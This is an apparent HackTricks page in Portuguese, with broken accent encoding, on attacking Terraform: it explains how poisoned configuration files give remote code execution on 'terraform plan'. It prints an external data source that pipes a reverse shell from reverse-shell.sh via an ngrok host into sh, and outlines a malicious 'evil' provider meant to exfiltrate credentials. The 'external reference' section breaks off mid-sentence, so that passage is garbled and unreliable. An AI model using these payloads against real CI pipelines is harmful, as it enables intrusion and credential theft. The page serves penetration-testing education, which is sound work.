# Seguran√ßa do Terraform

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **reposit√≥rios do github.**

</details>

## Informa√ß√µes b√°sicas

O HashiCorp Terraform √© uma ferramenta de **infraestrutura como c√≥digo** que permite definir recursos **em nuvem e locais** em arquivos de configura√ß√£o leg√≠veis por humanos que voc√™ pode versionar, reutilizar e compartilhar. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo do seu ciclo de vida. O Terraform pode gerenciar componentes de baixo n√≠vel, como recursos de computa√ß√£o, armazenamento e rede, bem como componentes de alto n√≠vel, como entradas DNS e recursos SaaS.

### Como o Terraform funciona?

O Terraform cria e gerencia recursos em plataformas em nuvem e outros servi√ßos por meio de suas interfaces de programa√ß√£o de aplicativos (APIs). Os provedores permitem que o Terraform trabalhe com praticamente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../../.gitbook/assets/image (33).png>)

A HashiCorp e a comunidade Terraform j√° escreveram **mais de 1700 provedores** para gerenciar milhares de tipos diferentes de recursos e servi√ßos, e esse n√∫mero continua a crescer. Voc√™ pode encontrar todos os provedores dispon√≠veis publicamente no [Terraform Registry](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e muitos mais.

O fluxo de trabalho b√°sico do Terraform consiste em tr√™s etapas:

* **Escrever:** Voc√™ define recursos, que podem estar em v√°rios provedores e servi√ßos em nuvem. Por exemplo, voc√™ pode criar uma configura√ß√£o para implantar um aplicativo em m√°quinas virtuais em uma rede Virtual Private Cloud (VPC) com grupos de seguran√ßa e um balanceador de carga.
* **Planejar:** O Terraform cria um plano de execu√ß√£o descrevendo a infraestrutura que criar√°, atualizar√° ou destruir√° com base na infraestrutura existente e em sua configura√ß√£o.
* **Aplicar:** Com aprova√ß√£o, o Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias de recursos. Por exemplo, se voc√™ atualizar as propriedades de uma VPC e alterar o n√∫mero de m√°quinas virtuais nessa VPC, o Terraform recriar√° a VPC antes de dimensionar as m√°quinas virtuais.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

O Terraform Enterprise permite que voc√™ **execute comandos** como `terraform plan` ou `terraform apply` remotamente em uma **vers√£o hospedada por voc√™ do Terraform Cloud**. Portanto, se voc√™ encontrar a **chave da API** para acessar esse servidor Terraform, poder√° **compromet√™-lo**.\
Para mais informa√ß√µes, consulte:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laborat√≥rio do Terraform

Basta instalar o terraform em seu computador.

Aqui voc√™ tem um [guia](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [melhor maneira de baixar o terraform](https://www.terraform.io/downloads).

## RCE no Terraform

O Terraform **n√£o tem uma plataforma que exponha uma p√°gina da web ou um servi√ßo de rede** que possamos enumerar, portanto, a √∫nica maneira de comprometer o terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform**.

No entanto, o terraform √© um **componente muito sens√≠vel** para comprometer porque ter√° **acesso privilegiado** a diferentes locais para que possa funcionar corretamente.

A principal maneira para um invasor ser capaz de comprometer o sistema onde o terraform est√° sendo executado √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas ser√£o **interpretadas**.

Na verdade, existem solu√ß√µes por a√≠ que **executam o plano/apply do terraform automaticamente ap√≥s a cria√ß√£o de um PR**, como o **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Se voc√™ conseguir comprometer um arquivo terraform, existem diferentes maneiras de executar RCE quando algu√©m executar `terraform plan` ou `terraform apply`.

### Terraform plan

O Terraform plan √© o **comando mais usado** no terraform e os desenvolvedores/solu√ß√µes que usam o terraform o chamam o tempo todo, portanto, a **maneira mais f√°cil de obter RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o do terraform que executar√° comandos arbitr√°rios em um `terraform plan`.

#### Usando um provedor externo

O Terraform oferece o provedor [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), que fornece uma maneira de interface entre o Terraform e programas externos. Voc√™ pode usar a fonte de dados `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injetar em um arquivo de configura√ß√£o do terraform algo como o seguinte executar√° um rev shell ao executar `terraform plan`:

```javascript
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Usando um provedor personalizado

Qualquer pessoa pode escrever um [provedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) e public√°-lo no [Terraform Registry](https://registry.terraform.io/). Voc√™ tamb√©m pode tentar puxar um provedor personalizado de um registro privado.

√â isso:

* escreva um provedor personalizado que execute algum c√≥digo malicioso (como exfiltrar credenciais ou dados do cliente)
  * publique-o no Terraform Registry
  * adicione o provedor ao c√≥digo do Terraform em um branch de recurso
  * abra um PR para o branch de recurso

```javascript
 terraform {
        required_providers {
            evil = {
                source  = "evil/evil"
                    version = "1.0"
            }
        }
    }

provider "evil" {}
```

Como o provedor ser√° puxado durante o `init` e executar√° algum c√≥digo durante o `plan`, voc√™ tem execu√ß√£o de c√≥digo arbitr√°rio.

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando uma refer√™ncia externa

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito furtivas (a segunda √© mais furtiva, mas mais complexa do que a primeira). Voc√™ pode realizar esse ataque at√© mesmo
## Ferramentas de Auditoria

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec usa an√°lise est√°tica do seu c√≥digo terraform para detectar poss√≠veis configura√ß√µes incorretas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √© um analisador de c√≥digo est√°tico para Infraestrutura como C√≥digo.

## Refer√™ncias

* [Atlantis Security](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>